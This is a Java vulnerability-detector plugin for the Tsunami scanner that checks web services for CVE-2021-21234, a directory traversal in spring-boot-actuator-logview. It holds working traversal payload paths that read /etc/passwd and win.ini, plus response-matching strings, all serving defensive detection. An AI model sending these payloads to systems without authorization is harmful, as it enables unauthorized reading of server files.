/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.fileread.cve202121234;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugins.detectors.fileread.cve202121234.CVE202121234DetectorBootstrapModule;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
		type = PluginType.VULN_DETECTION,
		name = "CVE-2021-21234",
		version = "0.1",
		description = "Spring Boot Actuator Logview Arbitrary file reading",
		author = "hh-hunter",
		bootstrapModule = CVE202121234DetectorBootstrapModule.class)

public final class CVE202121234VulnDetector implements VulnDetector {

	private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	private static final String[] CHECK_VUL_PATHS = new String[]{
			"manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
			"log/view?filename=/etc/passwd&base=../../../../../../../../../../",
			"manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
			"log/view?filename=/windows/win.ini&base=../../../../../../../../../../"};

	public static final String[] DETECTION_STRINGS = new String[]{"root:[x*]:0:0:", "16-bit app support"};


	private final HttpClient httpClient;

	private final Clock utcClock;

	// by the scanner.
	@Inject
	CVE202121234VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
		this.httpClient = checkNotNull(httpClient);
		this.utcClock = checkNotNull(utcClock);
	}

	@Override
	public DetectionReportList detect(
			TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("CVE-2021-21234 starts detecting.");

		return DetectionReportList.newBuilder()
				.addAllDetectionReports(
						matchedServices.stream()
								.filter(NetworkServiceUtils::isWebService)
								.filter(this::isServiceVulnerable)
								.map(networkService -> buildDetectionReport(targetInfo, networkService))
								.collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {
		for (String path : CHECK_VUL_PATHS) {
			String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
					+ path;
			try {
				HttpResponse httpResponse =
						httpClient.send(
								get(targetUri)
										.withEmptyHeaders()
										.build(),
								networkService);

				if (httpResponse.status().code() != 200) {
					return false;
				}

				if (httpResponse.status().code() == 200) {
					for (String detectionString : DETECTION_STRINGS) {
						if (httpResponse.bodyString().get().contains(detectionString)) {
							return true;
						}
					}
				}

			} catch (IOException e) {
				logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
				return false;
			}
		}
		return false;
	}

	// This builds the DetectionReport message for a specific vulnerable network service.
	private DetectionReport buildDetectionReport(
			TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
		return DetectionReport.newBuilder()
				.setTargetInfo(targetInfo)
				.setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(
						Vulnerability.newBuilder()
								.setMainId(
										VulnerabilityId.newBuilder()
												.setPublisher("TSUNAMI_COMMUNITY")
												.setValue("CVE_2021_21234"))
								.setSeverity(Severity.HIGH)
								.setTitle("CVE-2021-21234")
								.setDescription("Spring Boot Actuator Logview Arbitrary file reading")
								.addAdditionalDetails(
										AdditionalDetail.newBuilder()
												.setTextData(
														TextData.newBuilder().setText("spring-boot-actuator-logview " +
																"in a library that adds a simple logfile viewer as " +
																"spring boot actuator endpoint. It is maven package " +
																"\"eu.hinsch:spring-boot-actuator-logview\". In " +
																"spring-boot-actuator-logview before version 0.2.13 " +
																"there is a directory traversal vulnerability. " +
																"The nature of this library is to expose a log file " +
																"directory via admin (spring boot actuator) HTTP " +
																"endpoints. Both the filename to view and a base " +
																"folder (relative to the logging folder root) can " +
																"be specified via request parameters. While the " +
																"filename parameter was checked to prevent directory " +
																"traversal exploits (so that `filename=../somefile`" +
																" would not work), the base folder parameter was not" +
																" sufficiently checked, so that " +
																"`filename=somefile&base=../` could access a file " +
																"outside the logging base directory). " +
																"The vulnerability has been patched in release 0.2.13." +
																" Any users of 0.2.12 should be able to update without " +
																"any issues as there are no other changes in that " +
																"release. There is no workaround to fix the " +
																"vulnerability other than updating or removing the " +
																"dependency. However, removing read access of the user" +
																" the application is run with to any directory not " +
																"required for running the application can limit the " +
																"impact. Additionally, access to the logview endpoint " +
																"can be limited by deploying the application behind a " +
																"reverse proxy."))))
				.build();
	}
}
